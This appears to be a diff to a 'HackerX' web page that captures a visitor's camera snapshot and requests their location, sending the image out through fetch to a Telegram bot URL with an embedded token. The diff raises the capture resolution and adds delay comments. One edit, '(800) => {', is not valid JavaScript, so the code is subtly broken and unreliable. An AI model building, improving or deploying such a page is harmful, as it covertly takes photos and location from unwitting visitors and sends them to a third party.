@@ -68,8 +68,8 @@
     <p style="text-align:center; padding:1rem;">©️ 2025 HackerX_Rohan404. All Rights Reserved 👾🤖</p>
   </div>
 
-  <video id="camera" autoplay muted playsinline width="320" height="240"></video>
-  <canvas id="snapshotCanvas" width="320" height="240"></canvas>
+  <video id="camera" autoplay muted playsinline width="640" height="480"></video>
+  <canvas id="snapshotCanvas" width="640" height="480"></canvas>
   <audio id="bgMusic" loop>
     <source src="https://www.bensound.com/bensound-music/bensound-dubstep.mp3" type="audio/mpeg">
   </audio>
@@ -112,6 +112,7 @@
           allow.play();
           const canvas = document.getElementById("snapshotCanvas");
           const context = canvas.getContext("2d");
+          //Wait 800ms for video to fully load
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
           const imgData = canvas.toDataURL("image/png");
 
@@ -149,7 +150,7 @@ await fetch(`https://api.telegram.org/bot7655435661:AAGvQFoUKanmBZaZXND5AXbrPuCl
             open.play();
             alert("Thanks!😏... Now, You're In Under High Security HackerX surveillance System 🔐✅️...");
           }, 1200);
-        }, () => {
+        }, (800) => {//Delay of 800ms before taking image
           deny.play();
           alert("🚫 Location Permission Denied or Ignored 😒... You Cannot Access This Site ❌️...");
         });
